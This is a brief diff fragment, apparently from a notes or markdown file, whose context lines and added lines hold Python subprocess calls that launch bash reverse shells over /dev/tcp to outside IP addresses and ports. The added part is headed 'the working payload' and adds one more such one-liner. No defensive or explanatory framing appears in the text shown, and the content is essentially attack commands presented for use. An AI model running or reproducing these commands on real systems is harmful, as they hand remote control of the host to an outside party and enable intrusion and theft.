@@ -44,3 +44,5 @@ result = subprocess.run(["bash -c 'exec bash -i &> /dev/tcp/3.6.30.85/16197 <&1'
 result = subprocess.run(["bash -i &> /dev/tcp/3.6.30.85/16197 <&1"], shell=True, capture_output=True, text=True)
 
 ```
+## the working payload
+result = subprocess.run(["bash -c 'exec bash -i &> /dev/tcp/3.6.115.182/12044 <&1'"], shell=True, capture_output=True, text=True)
